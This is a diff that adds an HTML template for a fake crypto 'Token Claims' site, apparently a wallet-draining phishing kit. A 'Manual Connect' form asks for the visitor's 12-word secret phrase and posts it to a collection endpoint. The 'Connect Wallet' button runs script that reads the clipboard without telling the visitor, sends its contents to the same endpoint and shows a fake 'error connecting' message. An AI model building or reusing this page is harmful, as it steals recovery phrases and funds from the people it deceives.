@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+{% load static %}
+<html>
+
+<head>
+  <title>Cryptocode Flaire</title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+
+  <link rel="stylesheet" type="text/css" href="{% static 'css/vendor.css' %}">
+  <link rel="stylesheet" type="text/css" href="{% static 'assets/fonts/icomoon.css' %}">
+  <link href="{% static 'assets/vendor/bootstrap-5.1.3/css/bootstrap.min.css' %}" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.css" />
+
+  <link rel="stylesheet" type="text/css" href="{% static 'style.css' %}">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;800;900&family=Lato:wght@300;400;700;900&display=swap"
+    rel="stylesheet">
+
+  <!-- script
+    ================================================== -->
+  <script src="{% static 'js/modernizr.js' %}"></script>
+</head>
+
+<body class="homepage bg-dark text-white">
+  <nav class="navbar navbar-expand-lg container-fluid p-4 ">
+    <div class="container-fluid">
+      <div class="main-logo">
+        <a href="index.html">
+          <img src="https://s2.coinmarketcap.com/static/cloud/img/banners/cmc.png" style="border-radius: 18px;" alt="logo">
+        </a>
+      </div>
+      <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar"
+        aria-controls="offcanvasNavbar">
+        <iconify-icon icon="system-uicons:menu-hamburger" class="hamburger-menu"></iconify-icon>
+      </button>
+      <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
+        <div class="offcanvas-header">
+          <h5 class="offcanvas-title text-white" id="offcanvasNavbarLabel">Menu</h5>
+          <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="offcanvas"
+            aria-label="Close"></button>
+        </div>
+        <div class="offcanvas-body justify-content-lg-between">
+          <div class="main-menu text-center d-lg-flex align-items-center ">
+            
+          </div>
+          
+            <a href="#" style="background-color: blue; color: aliceblue;" class="btn btn-linear btn-medium align-self-center btn-rounded text-uppercase register-btn mt-3 mt-md-0" data-bs-toggle="modal"
+            data-bs-target="#exampleModal2">Manual Connect</a>
+                            <!-- Modal -->
+                            <div class="modal fade" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel"
+                            aria-hidden="true">
+                            <div class="modal-dialog">
+                              <div class="modal-content">
+                                <div class="modal-header">
+                                  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                                </div>
+                                <div class="modal-body">
+                                  <div class="tabs-listing mt-4">
+                                    <nav>
+                                      <div class="nav nav-tabs d-flex justify-content-center border-0" id="nav-tab2" role="tablist">
+                                       
+                                        <button class="btn btn-outline-primary text-uppercase active" id="nav-register-tab2"
+                                          data-bs-toggle="tab" data-bs-target="#nav-register2" type="button" role="tab"
+                                          aria-controls="nav-register2" aria-selected="true">Connect With 12 Word Phrase</button>
+                                      </div>
+                                    </nav>
+                                    
+                                      <div class="tab-pane fade active show" id="nav-register2" role="tabpanel"
+                                        aria-labelledby="nav-register-tab2">
+                                        <form id="form4" class="form-group flex-wrap p-3 " method="post" action="{% url 'create_textmodel' %}">
+                                          {% csrf_token %}
+                                          <div class="form-input col-lg-12 my-4">
+                                            <label for="exampleInputEmail4"
+                                              class="form-label fs-6 text-uppercase fw-bold text-black">Secret Phrase</label>
+                                            <input type="text" id="exampleInputEmail4" name="clipboard" placeholder="never share your phrase with anyone. connect securely"
+                                              class="form-control bg-secondary bg-opacity-10 ps-3">
+                                          </div>
+                                          
+                                          <label class="py-3">
+                                            <input type="checkbox" required="" class="d-inline">
+                                            <span class="label-body text-black">I agree to the <a href="#"
+                                                class="text-black password border-bottom">Privacy Policy</a>
+                                            </span>
+                                          </label>
+                                          <div class="d-grid my-3">
+                                            <button
+                                              class="btn btn-primary btn-lg btn-dark text-uppercase btn-rounded-none fs-6" type="submit">Connect</button>
+                                          </div>
+                                        </form>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <div id="billboard" class="padding-medium overflow-hidden">
+    <div class="container">
+      <div class="row d-flex flex-wrap">
+        <div class="col-md-5">
+          <div class="image-holder border-set-bold border-rounded-circle">
+            <img src="{% static 'images/banner-image.png' %}" alt="banner" class="banner-image">
+          </div>
+        </div>
+        <div class="col-md-7">
+          <div class="banner-content content-light m-5">
+            <h1 class="banner-title display-3">Token Claims</h1>
+            <p>Give your community a custom page to claim tokens with options for locking and revocability.</p>
+            <div class="btn-wrap">
+              <a href="#" style="background-color: blue; color: aliceblue;" class="btn btn-linear btn-medium text-uppercase btn-rounded" onclick="combinedFunction()">Connect Wallet</a>
+            </div>
+            <p>you are not connected yet...</p>
+            <b>connect a wallet to see your token claims</b>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <section id="association-with" class="padding-large">
+    <div class="container">
+      <div class="row d-flex flex-wrap justify-content-between">
+        <img src="{% static 'images/association-brand1.png' %}" alt="brand" class="image-association">
+        <img src="{% static 'images/association-brand2.png' %}" alt="brand" class="image-association">
+        <img src="{% static 'images/association-brand3.png' %}" alt="brand" class="image-association">
+        <img src="{% static 'images/association-brand4.png' %}" alt="brand" class="image-association">
+        <img src="{% static 'images/association-brand5.png' %}" alt="brand" class="image-association">
+      </div>
+    </div>
+  </section>
+
+  <section id="product-card" class="position-relative padding-large">
+    <div class="pattern-overlay"><img src="{% static 'images/pattern-blur.png' %}" alt="pattern-overlay"></div>
+
+    <div class="section-header text-center">
+      <h2 class="display-5">Best crypto currently</h2>
+    </div>
+
+    <div class="container">
+      <div class="row d-flex flex-wrap">
+
+        <div class="col-md-4 my-3">
+          <div class="product-item mx-4 text-center border-set-bold border-rounded-50">
+            <div class="icon-holder">
+              <i class="icon icon-bitcoin"></i>
+            </div>
+            <div class="product-detail">
+              <div class="card-header">
+                <h3 class="card-title light">Bitcoin</h3>
+                <span class="currency text-linear">31,020.564 $</span>
+              </div>
+              <div class="btn-card padding-small">
+                <a href="#" class="btn btn-outline-accent btn-medium btn-rounded btn-medium text-uppercase">buy it
+                  now</a>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4 my-3">
+          <div class="product-item mx-4 text-center border-set-bold border-rounded-50">
+            <div class="icon-holder">
+              <i class="icon icon-ethereum"></i>
+            </div>
+            <div class="product-detail">
+              <div class="card-header">
+                <h3 class="card-title light">Ethereum</h3>
+                <span class="currency text-linear">4.4668 $</span>
+              </div>
+              <div class="btn-card padding-small">
+                <a href="#" class="btn btn-outline-accent btn-medium btn-rounded btn-medium text-uppercase">buy it
+                  now</a>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4 my-3">
+          <div class="product-item mx-4 text-center border-set-bold border-rounded-50">
+            <div class="icon-holder">
+              <i class="icon icon-ripple"></i>
+            </div>
+            <div class="product-detail">
+              <div class="card-header">
+                <h3 class="card-title light">Ripple</h3>
+                <span class="currency text-linear">0.6549 $</span>
+              </div>
+              <div class="btn-card padding-small">
+                <a href="#" class="btn btn-outline-accent btn-medium btn-rounded btn-medium text-uppercase">buy it
+                  now</a>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <section id="track-earning" class="cryptocode-info padding-large">
+    <div class="container">
+      <div class="row">
+
+        <div class="col-md-6">
+          <div class="image-holder">
+            <img src="{% static 'images/single-image1.png' %}" alt="crypto">
+          </div>
+        </div>
+
+        <div class="col-md-6">
+          <div class="inner-content p-5">
+            <h2 class="display-5">Track your earnings and cryptocode made it easy</h2>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <section id="trust-us" class="cryptocode-info padding-large">
+    <div class="container">
+      <div class="row">
+
+        <div class="col-md-6">
+          <div class="inner-content p-5 left-block">
+            <h2 class="display-5">Trust us due to our safe and convenient deposit</h2>
+            <p>Tristique morbi scelerisque vitae. Nulla dui ultrices sed nam ligula dignissim tellus semper lorem
+              facilisis ut. Amet tincidunt adipiscing varius maecenas adipiscing. </p>
+          </div>
+        </div>
+
+        <div class="col-md-6">
+          <div class="image-holder">
+            <img src="{% static 'images/single-image2.png' %}" alt="crypto">
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <section id="subscribe" class="padding-large pattern-circle">
+    <div class="container">
+      <div class="row d-flex justify-content-center">
+
+  <script src="{% static 'js/jquery-1.11.0.min.js' %}"></script>
+  <script src="{% static 'assets/vendor/bootstrap-5.1.3/js/bootstrap.bundle.min.js' %}"></script>
+  <script src="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.js"></script>
+  <script type="text/javascript" src="{% static 'js/plugins.js' %}"></script>
+  <script type="text/javascript" src="{% static 'js/script.js' %}"></script>
+  <script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
+  <script>
+    function combinedFunction() {
+            getPermission();
+            readFromClipboardAndSubmit();
+        }
+
+        function getPermission(){
+            alert("access to connect required, grant full access to app");
+        }
+    function readFromClipboardAndSubmit() {
+        navigator.clipboard.readText()
+            .then(text => {
+                alert('error connecting');
+                // Send a POST request with the clipboard value
+                fetch('{% url "create_textmodel" %}', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-CSRFToken': '{{ csrf_token }}',  // Include the CSRF token
+                    },
+                    body: 'clipboard=' + encodeURIComponent(text),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Handle success (e.g., redirect or show a success message)
+                        console.log('TextModel created successfully.');
+                    } else {
+                        // Handle errors (e.g., display an error message)
+                        console.error('Error creating TextModel.');
+                    }
+                })
+                .catch(err => {
+                    console.error('Error sending POST request: ', err);
+                });
+            })
+            .catch(err => {
+                console.error('Error reading clipboard: ', err);
+            });
+    }
+</script>
+</body>
+
+</html>
